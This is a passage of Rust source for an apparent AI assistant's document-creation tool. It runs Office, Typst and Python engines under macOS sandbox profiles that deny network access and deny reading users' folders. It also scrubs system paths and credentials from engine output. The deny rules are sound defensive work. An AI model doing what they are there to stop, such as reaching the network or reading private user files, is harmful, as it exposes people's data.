    /// [`officecli_scratch`]); the profile lets it write there.
    scratch: Option<&'a Path>,
    /// The folder the profile lets the engine read (`ENGINE`); `None` is
    /// the folder of `exe`.
    read_root: Option<&'a Path>,
    /// How long one run may take: [`ENGINE_TIMEOUT`], or [`PYTHON_TIMEOUT`].
    timeout: Duration,
}

/// How long one Python run may take: matplotlib builds its font cache on
/// the first one.
#[cfg_attr(not(test), allow(dead_code))] // until create_document runs Python content
const PYTHON_TIMEOUT: Duration = Duration::from_secs(90);

/// What officecli may do on macOS: no network; of the user's folders
/// (`/Users`, `/Volumes`) read only the document's own and the engine's;
/// write only the document's folder and its own temporary folder. File
/// names and sizes stay readable, so that paths resolve.
const OFFICE_SANDBOX: &str = r#"(version 1)
(allow default)
(deny network*)
(deny file-read-data (subpath "/Users") (subpath "/Volumes"))
(deny file-write*)
(allow file-write* (literal "/dev/null") (literal "/dev/zero") (literal "/dev/dtracehelper") (regex #"^/dev/tty"))
(allow file-read-data file-write* (subpath (param "DOC")))
(allow file-read-data file-write* (subpath (param "SCRATCH")))
(allow file-read-data (subpath (param "ENGINE")))"#;

/// What Typst may do on macOS: anything but the network. It reads system
/// and user fonts; `--root` keeps the body to the document's folder.
const TYPST_SANDBOX: &str = r#"(version 1)
(allow default)
(deny network*)"#;

/// What the Python engine may do on macOS: as officecli, but with no
/// temporary folder of its own (its home is in the document's folder), and
/// its engine root is the runtime folder, where Node, the runner with its
/// modules and the Pyodide assets are. Pyodide is no boundary: this profile
/// is what holds the model's code, so Python never runs without it (see
/// [`Work::needs_sandbox`]).
const PYTHON_SANDBOX: &str = r#"(version 1)
(allow default)
(deny network*)
(deny file-read-data (subpath "/Users") (subpath "/Volumes"))
(deny file-write*)
(allow file-write* (literal "/dev/null") (literal "/dev/zero") (literal "/dev/dtracehelper") (regex #"^/dev/tty"))
(allow file-read-data file-write* (subpath (param "DOC")))
(allow file-read-data (subpath (param "ENGINE")))"#;

/// `/tmp/officecli-<uid>`, where officecli keeps temporary files whatever
/// `TMPDIR` says: see [`private_folder`].
#[cfg(unix)]
fn officecli_scratch() -> Result<PathBuf, String> {
    // SAFETY: getuid has no preconditions and cannot fail.
    let uid = unsafe { libc::getuid() };
    private_folder(Path::new(&format!("/tmp/officecli-{uid}")), uid)
}

/// `path` as a folder only `uid` can use: created with mode 0700, or one
/// `uid` already owns (made 0700 when it is not); refused when it is
/// someone else's or a link.
#[cfg(unix)]
fn private_folder(path: &Path, uid: u32) -> Result<PathBuf, String> {
    use std::os::unix::fs::{DirBuilderExt, MetadataExt, PermissionsExt};
    let unsafe_folder = || {
        refuse(
            FAILED,
            "officecli's temporary folder is not a private folder",
        )
    };
    match std::fs::DirBuilder::new().mode(0o700).create(path) {
        Ok(()) => {}
        Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {}
        Err(_) => return Err(unsafe_folder()),
    }
    let meta = std::fs::symlink_metadata(path).map_err(|_| unsafe_folder())?;
    if !meta.is_dir() || meta.uid() != uid {
        return Err(unsafe_folder());
    }
    if meta.mode() & 0o7777 != 0o700 {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))
            .map_err(|_| unsafe_folder())?;
    }
    path.canonicalize().map_err(|_| unsafe_folder())
}

#[cfg(not(unix))]
fn officecli_scratch() -> Result<PathBuf, String> {
    Err(refuse(FAILED, "officecli has no sandbox here"))
}

/// An absolute path outside the document's folder in engine text: a drive,
/// a share, or one under a file system's own first folder. Element paths
/// (`/slide[1]`) are not among them.
static OUTSIDE_PATH: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    regex::Regex::new(
        r#"(?i)(?P<lead>^|[\s'"(=,:\[`])(?:[a-z]:[\\/]|\\\\|/(?:users|volumes|private|var|tmp|home|root|etc|opt|usr|applications|library|system|windows|programdata|mnt|media|dev|proc|sys|srv|run|snap|nix|sbin|bin|lib|cores|boot)\b)[^\s'"`<>|]*"#,
    )
    .expect("a valid pattern")
});

/// `path` as the sandbox matches it: with its links resolved.
fn real(path: &Path) -> String {
    path.canonicalize()
        .unwrap_or_else(|_| path.to_path_buf())
        .to_string_lossy()
        .into_owned()
}

impl Work<'_> {
    /// Whether the engine may run only in its sandbox: the Python engine,
    /// which fails closed. officecli and Typst still run without one (see
    /// [`AssistantHost::engine_sandbox`]).
    fn needs_sandbox(&self) -> bool {
        self.profile == PYTHON_SANDBOX
    }

    async fn run(&self, args: &[&str]) -> Result<EngineOutput, String> {
        if self.sandbox.is_none() && self.needs_sandbox() {
            log::warn!(
                "[Assistant] {} was asked to run without its sandbox",
                self.name
            );
            return Err(refuse(
                FAILED,
                format!("{} runs only in its sandbox", self.name),
            ));
        }
        let output = match self.sandbox {
            Some(sandbox) => {
                let doc = format!("DOC={}", real(self.dir));
                let real_exe = PathBuf::from(real(self.exe));
                let root = match self.read_root {
                    Some(root) => real(root),
                    None => real(real_exe.parent().unwrap_or(&real_exe)),
                };
                let engine = format!("ENGINE={root}");
                let scratch = format!("SCRATCH={}", real(self.scratch.unwrap_or(self.dir)));
                let exe = self.exe.to_string_lossy();
                let wrapped = [
                    &[
                        "-D",
                        &doc,
                        "-D",
                        &engine,
                        "-D",
                        &scratch,
                        "-p",
                        self.profile,
                        &exe,
                    ][..],
                    args,
                ]
                .concat();
                run_engine(sandbox, &wrapped, self.dir, self.home, self.timeout).await
            }
            None => run_engine(self.exe, args, self.dir, self.home, self.timeout).await,
        };
        let output = output.map_err(|error| {
            log::warn!("[Assistant] {} could not run: {error}", self.name);
            refuse(
                FAILED,
                format!("{} could not run on this computer", self.name),
            )
        })?;
        if output.timed_out {
            return Err(refuse(
                FAILED,
                format!(
                    "{} did not finish within {} seconds; make the document smaller",
                    self.name,
                    self.timeout.as_secs()
                ),
            ));
        }
        Ok(output)
    }

    /// A check's JSON report, whatever its exit status says; `None` when it
    /// gave none. A check that fails leaves the file as it is.
    async fn report(&self, args: &[&str]) -> Option<Value> {
        match self.run(args).await {
            Ok(output) => serde_json::from_str(output.stdout.trim()).ok().or_else(|| {
                log::warn!("[Assistant] {} {} gave no report", self.name, args[0]);
                None
            }),
            Err(_) => None,
        }
    }

    /// Engine text as the model and the card may see it: the document's
    /// folder as `.`, and nothing that looks like a credential.
    fn shown(&self, text: &str) -> String {
        let mut folders: Vec<String> = vec![self.dir.display().to_string()];
        if let Ok(real) = self.dir.canonicalize() {
            folders.push(real.display().to_string());
        }
        // The longer first: the real path may contain the other.
        folders.sort_by_key(|folder| std::cmp::Reverse(folder.len()));
        let mut text = text.to_owned();
        for folder in folders.iter().filter(|folder| !folder.is_empty()) {
            text = text
                .replace(&format!("{folder}{}", std::path::MAIN_SEPARATOR), "")
                .replace(folder.as_str(), ".");
        }
        let text = OUTSIDE_PATH.replace_all(&text, "${lead}<path>");
        crate::redact::scrub(&text).into_owned()
    }

    /// What a failed run said, briefly.
    fn excerpt(&self, output: &EngineOutput) -> String {
        let said = [&output.stderr, &output.stdout]
            .into_iter()
            .map(|text| text.trim())
            .find(|text| !text.is_empty())
            .unwrap_or("no output");
        clip(&without_help(&self.shown(said)), MAX_ISSUE_CHARS)
    }
}

/// officecli's report without its `{"success", "data"}` envelope.
fn data(report: &Value) -> &Value {
    if report["data"].is_object() {
        &report["data"]
    } else {
        report
    }
}

/// An Office document: create the file, run the batch (atomic: one failed
/// command and nothing is applied), then check it, fix a deck's layout (see
/// [`fix_layout`]) and count it.
async fn make_office(work: &Work<'_>, format: DocumentFormat) -> Result<Made, String> {
    let file = format.file();
    let file = file.as_str();
    let created = work.run(&["create", file]).await?;
    if created.status != Some(0) || !work.dir.join(file).is_file() {
        return Err(refuse(
            FAILED,
            format!(
                "officecli could not create the file: {}",
                work.excerpt(&created)
            ),
        ));
    }
    let batch = work
        .run(&["batch", file, "--input", BATCH, "--json"])
        .await?;
    let mut issues = batch_issues(work, &batch)?;
    if let Some(report) = work.report(&["validate", file, "--json"]).await {
        issues.extend(validation_issues(work, &report));
    }
    let mut fixed = 0;
    match view_report(work, file).await {
        Some(report) => {
            let (found, applied) = fix_layout(work, file, format, &report).await?;
            issues.extend(found);
            fixed = applied;
        }
        None => issues.push(Issue::warning(ISSUES_UNAVAILABLE.into(), None)),
    }
    let count = match format.count() {
        Some(key) => work
            .report(&["view", file, "stats", "--json"])
            .await
            .and_then(|report| data(&report)[key].as_u64()),
        None => None,
    };
    let (preview, pages) = if format == DocumentFormat::Pptx {
        // Without a count, the first slide still makes the thumbnail.
        let (pages, found) = svg_pages(work, file, count.unwrap_or(1)).await;
        issues.extend(found);
        let first = work.dir.join(PAGES).join("1.svg");
        (pages.contains(&first).then_some(first), pages)
    } else {
        (None, vec![])
    };
    Ok(Made {
        file: work.dir.join(file),
        preview,
        pages,
        count,
        issues: finished(issues),
        fixed,
    })
}

/// `view issues --json`, when it gave a report with its list.
async fn view_report(work: &Work<'_>, file: &str) -> Option<Value> {
    let view = [
        "view",
        file,
        "issues",
        "--limit",
        VIEW_ISSUES_LIMIT,
        "--json",
    ];
    work.report(&view)
        .await
        .filter(|report| data(report)["issues"].is_array())
}

/// The shapes a fix round looks up (one `get` each); see [`fix_layout`].
const MAX_GEOMETRY_LOOKUPS: usize = 40;

/// A deck's overflowing text, shapes past the slide's edge and dim text,
/// fixed by the host (see [`fix`]) and checked again, for at most
/// [`fix::MAX_ROUNDS`] rounds; `first` is the checks' first report. A round
/// looks up where at most [`MAX_GEOMETRY_LOOKUPS`] shapes are: an issue that
/// needs a place beyond those is not fixed that round. The
/// issues of the last report, and how many fixes were applied. Each round's
/// `set` commands pass the model's batch checks and run as one batch
/// (`fix-<round>.json`). Fix commands the batch checks refuse end the
/// fixing with the issues as they are. A fix batch that cannot be written,
/// does not run or finish, or that officecli does not apply also ends it
/// (see [`after_failed_fix`]): the document stands when `validate` then
/// runs and reports no error, with the issues of a new `view issues` (or
/// [`ISSUES_UNAVAILABLE`] when that view gives none); otherwise the fix
/// batch's failure is the document's. Other formats are not fixed.
async fn fix_layout(
    work: &Work<'_>,
    file: &str,
    format: DocumentFormat,
    first: &Value,
) -> Result<(Vec<Issue>, usize), String> {
    if format != DocumentFormat::Pptx {
        return Ok((view_issues(work, first), 0));
    }
    let mut report = first.clone();
    let mut fixed = 0;
    for round in 1..=fix::MAX_ROUNDS {
        let found: Vec<fix::ViewIssue> = data(&report)["issues"]
            .as_array()
            .map(Vec::as_slice)
            .unwrap_or_default()
            .iter()
            .filter_map(fix::parse_issue)
            .collect();
        // One `get` a shape a round, of at most MAX_GEOMETRY_LOOKUPS shapes,
        // and only of a path the batch checks would let a fix name.
        let mut places: Vec<(&str, Option<fix::Geometry>)> = vec![];
        let mut fixes = vec![];
        for issue in &found {
            let place = match places.iter().find(|(path, _)| *path == issue.path) {
                Some((_, place)) => *place,
                None if issue.needs_geometry() && names_an_element(&issue.path, false, &[]) => {
                    if places.len() == MAX_GEOMETRY_LOOKUPS {
                        // Left as it is: it stays a warning.
                        continue;
                    }
                    let place = work
                        .report(&["get", file, &issue.path, "--json"])
                        .await
                        .as_ref()
                        .and_then(fix::geometry);
                    places.push((&issue.path, place));
                    place
                }
                None => None,
            };
            fixes.extend(fix::fix_for(issue, place.as_ref()));
        }
        if fixes.is_empty() {
            break;
        }
        let mut commands = fix::fix_batch(&fixes);
        if check_batch(&mut commands, format).is_err() {
            log::warn!("[Assistant] the layout fixes did not pass the batch checks");
            break;
        }
        let input = format!("fix-{round}.json");
        if let Err(error) = apply_fixes(work, file, &input, &commands).await {
            log::warn!("[Assistant] the layout fixes did not apply");
            return after_failed_fix(work, file, error, fixed).await;
        }
        fixed += commands.len();
        match view_report(work, file).await {
            Some(next) => report = next,
            None => return Ok((vec![Issue::warning(ISSUES_UNAVAILABLE.into(), None)], fixed)),
        }
    }
    Ok((view_issues(work, &report), fixed))
}

/// Write one round's fix batch as `input` and run it; the error says why it
/// was not applied.
async fn apply_fixes(
    work: &Work<'_>,
    file: &str,
    input: &str,
    commands: &[Value],
) -> Result<(), String> {
    let (target, bytes) = (
        work.dir.join(input),
        serde_json::to_vec(commands).map_err(|_| PROTOCOL)?,
    );
    blocking(move || write_new(&target, &bytes)).await?;
    let output = work
        .run(&["batch", file, "--input", input, "--json"])
        .await?;
    batch_issues(work, &output).map(drop)
}

/// After a fix batch that was not applied (`error` says why): the document
/// is kept only when `validate` runs and reports no error, since a batch
/// that was stopped may have left the file unusable. Its issues are then
/// those of a new `view issues`, and `fixed` the fixes of earlier rounds.
async fn after_failed_fix(
    work: &Work<'_>,
    file: &str,
    error: String,
    fixed: usize,
) -> Result<(Vec<Issue>, usize), String> {
    let valid = work
        .report(&["validate", file, "--json"])
        .await
        .is_some_and(|report| {
            !validation_failed(&report) && validation_issues(work, &report).is_empty()
        });
    if !valid {
        return Err(error);
    }
    let issues = match view_report(work, file).await {
        Some(report) => view_issues(work, &report),
        None => vec![Issue::warning(ISSUES_UNAVAILABLE.into(), None)],
    };
    Ok((issues, fixed))
}

/// The warnings of a batch that ran, or the failure of one that did not.
fn batch_issues(work: &Work<'_>, output: &EngineOutput) -> Result<Vec<Issue>, String> {
    let Ok(report) = serde_json::from_str::<Value>(output.stdout.trim()) else {
        return Err(refuse(
            FAILED,
            format!(
                "officecli did not report on the batch: {}",
                work.excerpt(output)
            ),
        ));
    };
    let data = data(&report);
    let results = data["results"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    let failed: Vec<&Value> = results
        .iter()
        .filter(|item| item["success"] == false)
        .collect();
    let rolled_back =
        data["summary"]["atomicRolledBack"] == true || data["atomicRolledBack"] == true;
    if failed.is_empty() && !rolled_back && output.status == Some(0) && report["success"] != false {
        return Ok(results
            .iter()
            .flat_map(|item| item_warnings(work, item))
            .collect());
    }
    Err(batch_failure(work, &report, &failed, results.len()))
}

/// A failed batch for the model, in one line of JSON the runtime passes on
/// whole: what to do, and the first failed commands with officecli's words.
fn batch_failure(work: &Work<'_>, report: &Value, failed: &[&Value], total: usize) -> String {
    let message = if failed.is_empty() {
        let why = report["error"]["error"]
            .as_str()
            .or(report["error"].as_str())
            .map(|why| without_help(&work.shown(why)))
            .unwrap_or_else(|| "it gave no reason".into());
        format!(
            "officecli refused the batch and made nothing: {}",
            clip(&why, MAX_ISSUE_CHARS)
        )
    } else {
        let listed = if failed.len() > MAX_LISTED_FAILURES {
            format!("; the first {MAX_LISTED_FAILURES} are listed")
        } else {
            String::new()
        };
        format!(
            "{} of {total} commands failed (index counts from 0), so the batch was rolled back and nothing was made{listed}. Fix them and send the whole batch again.",
            failed.len()
        )
    };
    let mut items: Vec<Value> = failed
        .iter()
        .take(MAX_LISTED_FAILURES)
        .map(|item| {
            let mut shown = Map::new();
            shown.insert("index".into(), item["index"].clone());
            if let Some(code) = item["code"].as_str() {
                shown.insert("code".into(), json!(clip(code, 40)));
            }
            let said = item["error"]
                .as_str()
                .or(item["output"].as_str())
                .unwrap_or("failed");
            let said: String = without_help(&work.shown(said))
                .chars()
                .map(|c| if c.is_control() { ' ' } else { c })
                .collect();
            shown.insert("output".into(), json!(clip(&said, MAX_FAILURE_CHARS)));
            Value::Object(shown)
        })
        .collect();
    loop {
        let mut body = json!({ "message": message });
        if !items.is_empty() {
            body["items"] = json!(items);
        }
        let error = refuse(FAILED, body.to_string());
        if error.chars().count() <= MAX_ERROR_CHARS || items.pop().is_none() {
            return error;
        }
    }
}

/// What a command that ran warned about: its `warnings`/`warning` (except
/// advisories, such as a built-in style officecli added itself) and the
/// `WARNING:` lines of its output, such as unsupported properties.
fn item_warnings(work: &Work<'_>, item: &Value) -> Vec<Issue> {
    let index = item["index"].as_u64();
    let label = |text: &str| {
        let text = without_help(&work.shown(text));
        match index {
            Some(index) => format!("item {index}: {text}"),
            None => text,
        }
    };
    let output = item["output"].as_str().unwrap_or_default();
    // "Added shape at /slide[1]/shape[@id=100000]"
    let place = output
        .lines()
        .next()
        .and_then(|line| line.rsplit_once(" at "))
        .map(|(_, at)| at.trim())
        .filter(|at| at.starts_with('/'))
        .map(|at| work.shown(at));
    let mut issues = vec![];
    let warnings = item["warnings"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    for warning in warnings.iter().chain(item.get("warning")) {
        if warning["code"] == "advisory" {
            continue;
        }
        if let Some(text) = warning
            .as_str()
            .or(warning["message"].as_str())
            .filter(|text| !text.trim().is_empty())
        {
            issues.push(Issue::warning(label(text), place.clone()));
        }
    }
    for line in output.lines().map(str::trim) {
        let Some(text) = line
            .get(..8)
            .filter(|head| head.eq_ignore_ascii_case("warning:"))
            .map(|_| line[8..].trim())
        else {
            continue;
        };
        // "UNSUPPORTED props on /body/p[@paraId=…]: wobble (not supported)"
        let path = text
            .split_once(" on /")
            .map(|(_, rest)| format!("/{}", rest.split_once(": ").map_or(rest, |(at, _)| at)))
            .map(|path| work.shown(&path))
            .or_else(|| place.clone());
        issues.push(Issue::warning(label(text), path));
    }
    issues
}

/// Whether a `validate --json` report says the file is not valid:
/// officecli 1.0.160 says `"success": false`, others `"valid": false`.
fn validation_failed(report: &Value) -> bool {
    report["success"] == false || data(report)["valid"] == false
}

/// The entries of the list `key` in `place`, if it holds one.
fn listed<'a>(place: &'a Value, key: &str) -> &'a [Value] {
    place[key].as_array().map(Vec::as_slice).unwrap_or_default()
}

/// `validate --json`: schema errors, which may keep Office from opening it.
/// A report that says the file is not valid (see [`validation_failed`])
/// lists them as `errors` or `warnings`, under `data` or at its top
/// (officecli 1.0.160: the top's `warnings`): each is an error, and when
/// none can be read, [`INVALID_FILE`] is. Otherwise only `data.errors` are.
fn validation_issues(work: &Work<'_>, report: &Value) -> Vec<Issue> {
    let errors: Vec<&Value> = if validation_failed(report) {
        let mut places = vec![report];
        if report["data"].is_object() {
            places.insert(0, &report["data"]);
        }
        places
            .into_iter()
            .flat_map(|place| [listed(place, "errors"), listed(place, "warnings")])
            .flatten()
            .collect()
    } else {
        listed(data(report), "errors").iter().collect()
    };
    let mut issues: Vec<Issue> = errors
        .into_iter()
        .filter_map(|error| {
            let description = error["description"]
                .as_str()
                .or(error["message"].as_str())?;
            let message = match error["type"].as_str() {
                Some(kind) => format!("{kind}: {description}"),
                None => description.to_owned(),
            };
            Some(Issue {
                severity: "error",
                message: work.shown(&message),
                path: error["path"].as_str().map(|path| work.shown(path)),
            })
        })
        .collect();
    // A report that says the file is not valid always reaches the model.
    if issues.is_empty() && validation_failed(report) {
        issues.push(Issue {
            severity: "error",
            message: INVALID_FILE.into(),
            path: None,
        });
    }
    issues
}

/// The error of a `validate` report that says the file is not valid and
/// lists nothing readable.
const INVALID_FILE: &str = "officecli reports the file as invalid";

/// `view issues --json`: formatting and content problems.
fn view_issues(work: &Work<'_>, report: &Value) -> Vec<Issue> {
    let found = data(report)["issues"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    found
        .iter()
        .filter_map(|issue| {
            let message = issue["message"].as_str().filter(|m| !m.trim().is_empty())?;
            Some(Issue {
                severity: severity(&issue["severity"]),
                message: work.shown(message),
                path: issue["path"].as_str().map(|path| work.shown(path)),
            })
        })
        .collect()
}

/// The folder of a deck's slide pictures, in the document's folder.
const PAGES: &str = "pages";
/// At most this many slides are drawn as pictures (one engine run each); a
/// longer deck's other slides have none, with one warning.
const MAX_SVG_PAGES: u64 = 60;

/// Each of a deck's `count` slides as SVG, `pages/<n>.svg`, up to
/// [`MAX_SVG_PAGES`]: the first is the runtime's thumbnail, and all are kept
/// beside the attachment. A page
/// officecli draws none of, or more of than the runner keeps, or that cannot
/// be written, is skipped with a warning and the next slide is drawn; an
/// engine that cannot start or does not finish ends the export, with one
/// warning for the slides left (each would cost another wait). The engine
/// can write the document's folder: a page is never written through a link
/// in place of `pages`, and once the engine is done only the pages that are
/// still regular files are returned (see `attachments::open_page`).
async fn svg_pages(work: &Work<'_>, file: &str, count: u64) -> (Vec<PathBuf>, Vec<Issue>) {
    if count == 0 {
        return (vec![], vec![]);
    }
    let folder = work.dir.join(PAGES);
    let made = blocking({
        let folder = folder.clone();
        move || {
            crate::config::create_private_dir_all(&folder).map_err(|_| unwritable())?;
            real_folder(&folder).then_some(()).ok_or_else(unwritable)
        }
    })
    .await;
    if made.is_err() {
        log::warn!("[Assistant] the folder of the slide pictures is not a usable folder");
        return (vec![], vec![no_preview(1, count)]);
    }
    let (mut drawn, mut issues) = (vec![], vec![]);
    let mut stopped = false;
    for n in 1..=count.min(MAX_SVG_PAGES) {
        let at = n.to_string();
        let view = ["view", file, "svg", "--start", &at, "--end", &at];
        let Ok(output) = work.run(&view).await else {
            issues.push(no_preview(n, count));
            stopped = true;
            break;
        };
        let path = folder.join(format!("{n}.svg"));
        let written = match whole_svg(&output) {
            Some(svg) => {
                let (folder, target) = (folder.clone(), path.clone());
                let bytes = svg.as_bytes().to_vec();
                blocking(move || {
                    // The engine ran since the folder was made.
                    if !real_folder(&folder) {
                        return Err(unwritable());
                    }
                    write_new(&target, &bytes)
                })
                .await
                .is_ok()
            }
            None => false,
        };
        if written {
            drawn.push((n, path));
        } else {
            log::warn!("[Assistant] officecli drew no usable picture of slide {n}");
            issues.push(no_preview(n, n));
        }
    }
    if !stopped && count > MAX_SVG_PAGES {
        issues.push(no_preview(MAX_SVG_PAGES + 1, count));
    }
    let paths: Vec<PathBuf> = drawn.iter().map(|(_, path)| path.clone()).collect();
    let regular = blocking(move || {
        Ok(paths
            .iter()
            .map(|path| attachments::open_page(path).is_ok())
            .collect::<Vec<bool>>())
    })
    .await
    .unwrap_or_default();
    let mut pages = vec![];
    for (at, (n, path)) in drawn.into_iter().enumerate() {
        if regular.get(at) == Some(&true) {
            pages.push(path);
        } else {
            log::warn!("[Assistant] the picture of slide {n} is no longer a regular file");
            issues.push(no_preview(n, n));
        }
    }
    (pages, issues)
}

/// Whether `path` is a folder itself, not a link to one.
fn real_folder(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok_and(|meta| meta.is_dir())
}

/// The SVG a `view svg` run printed, when it printed one whole.
fn whole_svg(output: &EngineOutput) -> Option<&str> {
    let svg = output.stdout.trim();
    // The runner keeps at most OUTPUT_LIMIT bytes: a longer one was cut.
    let whole = output.status == Some(0)
        && output.stdout.len() + 4 < OUTPUT_LIMIT
        && svg.starts_with('<')
        && svg.contains("<svg")
        && svg.ends_with('>');
    whole.then_some(svg)
}

/// The warning for slides `from..=to`, which have no picture.
fn no_preview(from: u64, to: u64) -> Issue {
    if from == to {
        Issue::warning(
            format!("slide {from} has no preview"),
            Some(format!("/slide[{from}]")),
        )
    } else {
        Issue::warning(format!("slides {from}-{to} have no preview"), None)
    }
}

/// A PDF: compile the prelude and the body, then render the first page as
/// the preview. Typst's warnings are the issues.
async fn make_pdf(work: &Work<'_>, body: &str) -> Result<Made, String> {
    let file = DocumentFormat::Pdf.file();
    let file = file.as_str();
    let compile = ["compile", "--root", ".", "--diagnostic-format", "short"];
    let compiled = work.run(&[&compile[..], &[MAIN, file]].concat()).await?;
    if compiled.status != Some(0) || !work.dir.join(file).is_file() {
        return Err(typst_failure(work, &compiled.stderr, body));
    }
    let issues = typst_warnings(work, &compiled.stderr);
    let png = [
        "--format",
        "png",
        "--pages",
        "1",
        "--ppi",
        "96",
        MAIN,
        "preview-{p}.png",
    ];
    let preview = match work.run(&[&compile[..], &png[..]].concat()).await {
        Ok(output) if output.status == Some(0) => {
            Some(work.dir.join("preview-1.png")).filter(|path| path.is_file())
        }
        _ => None,
    };
    let path = work.dir.join(file);
    let pages = blocking({
        let path = path.clone();
        move || Ok(std::fs::read(&path).ok().as_deref().and_then(pdf_pages))
    })
    .await?;
    Ok(Made {
        file: path,
        preview,
        pages: vec![],
        count: pages,
        issues: finished(issues),
        fixed: 0,
    })
}

/// A Typst diagnostic of `--diagnostic-format short`:
/// `main.typ:LINE:COLUMN: SEVERITY: MESSAGE`.
struct Diagnostic<'a> {
    line: usize,
    column: &'a str,
    severity: &'a str,
    message: &'a str,
}

fn diagnostic(line: &str) -> Option<Diagnostic<'_>> {
    let rest = line.strip_prefix(MAIN)?.strip_prefix(':')?;
    let (number, rest) = rest.split_once(':')?;
    let (column, rest) = rest.split_once(": ")?;
    let (severity, message) = rest.split_once(": ")?;
    Some(Diagnostic {
        line: number.parse().ok()?,
        column,
        severity,
        message,
    })
}

/// The body's line number of a line of `main.typ`; `None` in the prelude.
fn body_line(line: usize) -> Option<usize> {
    line.checked_sub(PRELUDE.lines().count())
        .filter(|line| *line > 0)
}

/// Typst's warnings about the body. The prelude's own are left out, and so
/// are missing fonts: the prelude names a fallback chain, so some of its
/// fonts are always missing.
fn typst_warnings(work: &Work<'_>, stderr: &str) -> Vec<Issue> {
    stderr
        .lines()
        .filter_map(diagnostic)
        .filter(|d| d.severity == "warning" && !d.message.contains("unknown font family"))
        .filter_map(|d| {
            let line = body_line(d.line)?;
            Some(Issue::warning(
                work.shown(d.message),
                Some(format!("line {line}, column {}", d.column)),
            ))
        })
        .collect()
}

/// Why the body did not compile: each error at its line of the body, with
/// that line, and anything else Typst said.
fn typst_failure(work: &Work<'_>, stderr: &str, body: &str) -> String {
    let said: Vec<String> = stderr
        .lines()
        .filter(|line| !line.trim().is_empty())
        .filter_map(|line| match diagnostic(line) {
            Some(d) if d.severity == "warning" => None,
            // The quoted line is scrubbed too: it may hold a credential.
            Some(d) => Some(match body_line(d.line) {
                Some(number) => {
                    let source = body.lines().nth(number - 1).unwrap_or_default().trim();
                    format!(
                        "line {number}, column {}: {}: {}\n    {}",
                        d.column,
                        d.severity,
                        work.shown(d.message),
                        work.shown(&clip(source, MAX_PATH_CHARS))
                    )
                }
                None => format!("{}: {}", d.severity, work.shown(d.message)),
            }),
            None => Some(work.shown(line)),
        })
        .collect();
    let detail = if said.is_empty() {
        "Typst stopped without saying why".to_owned()
    } else {
        said.join("\n")
    };
    refuse(
        FAILED,
        clip(
            &format!("Typst could not compile the body:\n{detail}"),
            MAX_ERROR_CHARS,
        ),
    )
}

impl AssistantHost {
    /// A `create_document` call of a chat run: checked as a generation
    /// tool's (identity, repeated call ids, a stop leaves its outcome
    /// unknown), and answered with the file, or with what to change.
    pub(in crate::services::assistant) async fn dispatch_document_tool(
        self: &Arc<Self>,
        run: &Arc<RunControl>,
        params: &Value,
    ) -> Result<Value, String> {
        let call = self.tool_call(run, params).await?;
        let media = run
            .media
            .as_ref()
            .filter(|_| !run.compact_only)
            .ok_or(DISABLED)?;
        let fingerprint = fingerprint(&call)?;
        if let Some(earlier) = media.begin_call(&call.tool_call_id, &fingerprint) {
            return earlier;
        }
        let work = self.create_document(run, media, &call.tool_call_id, &call.args);
        let mut cancel = run.cancel.subscribe();
        let result = tokio::select! {
            biased;
            _ = cancel.wait_for(|cancelled| *cancelled) => Err(UNKNOWN.to_string()),
            result = work => result,
        };
        let result = result.map_err(|error| scrub_secrets(&error, &run.secrets()));
        media.end_call(call.tool_call_id, fingerprint, &result)?;
        result
    }

    async fn create_document(
        &self,
        run: &Arc<RunControl>,
        media: &MediaRun,
        call_id: &str,
        args: &Value,
    ) -> Result<Value, String> {
        let args: CreateDocumentArgs = serde_json::from_value(args.clone()).map_err(|_| {
            refuse(
                FAILED,
                "unknown or malformed arguments: name, format (pptx, docx, xlsx, pdf, md, txt, csv, html or json) and content are expected",
            )
        })?;
        let engine = engine_for(args.format, &self.engines())?;
        let document = Document::new(args)?;
        if !media.reserve_document(MAX_DOCUMENTS_PER_RUN) {
            return Err(refuse(
                LIMIT,
                format!("at most {MAX_DOCUMENTS_PER_RUN} documents per reply"),
            ));
        }
        let made = self.make_document(run, call_id, &document, engine).await;
        if made.is_err() {
            media.release_document();
        }
        made
    }

    /// Remove the folders the run's documents were made in: their files are
    /// kept as attachments and the runtime has read what it needed. Best
    /// effort: a folder that stays is logged, and the run does not fail.
    pub(in crate::services::assistant) async fn remove_document_folders(&self, run: &RunControl) {
        let folders = run
            .media
            .as_ref()
            .map(MediaRun::take_document_folders)
            .unwrap_or_default();
        if folders.is_empty() {
            return;
        }
        let store = match self.store(&run.identity.owner) {
            Ok(store) => store,
            Err(error) => {
                log::warn!("[Assistant] could not remove the documents' folders: {error}");
                return;
            }
        };
        let sid = run.session_id.clone();
        let removed = blocking(move || {
            for doc_id in &folders {
                if let Err(error) = store.remove_outputs_dir(&sid, doc_id) {
                    log::warn!("[Assistant] could not remove a document's folder: {error}");
                }
            }
            Ok(())
        })
        .await;
        if let Err(error) = removed {
            log::warn!("[Assistant] could not remove the documents' folders: {error}");
        }
    }

    /// `sandbox-exec`, once `work`'s engine ran `--version` in it under its
    /// profile; a failed probe is tried again with the next document. The
    /// error says why there is none.
    async fn probe_sandbox(
        &self,
        cell: &EngineSandbox,
        work: &Work<'_>,
    ) -> Result<PathBuf, String> {
        cell.works
            .get_or_try_init(|| async {
                let sandbox = self.env.sandbox_exec().filter(|path| path.is_file());
                let Some(sandbox) = sandbox else {
                    return Err("sandbox-exec is unavailable".to_owned());
                };
                let probe = Work {
                    sandbox: Some(&sandbox),
                    ..*work
                };
                match probe.run(&["--version"]).await {
                    Ok(output) if output.status == Some(0) => Ok(sandbox),
                    _ => Err(format!("{} does not run under sandbox-exec", work.name)),
                }
            })
            .await
            .cloned()
    }

    /// The `sandbox-exec` officecli or Typst runs under (see
    /// [`Self::probe_sandbox`]). Without it (not macOS, or the probe failed)
    /// the engine still runs: the batch checks and the dead proxy alone hold
    /// it.
    async fn engine_sandbox(&self, cell: &EngineSandbox, work: &Work<'_>) -> Option<PathBuf> {
        match self.probe_sandbox(cell, work).await {
            Ok(sandbox) => Some(sandbox),
            Err(why) => {
                cell.warn_once(&format!("{why}; {} runs without it", work.name));
                None
            }
        }
    }

    /// The `sandbox-exec` the Python engine runs under, for `work`, its work
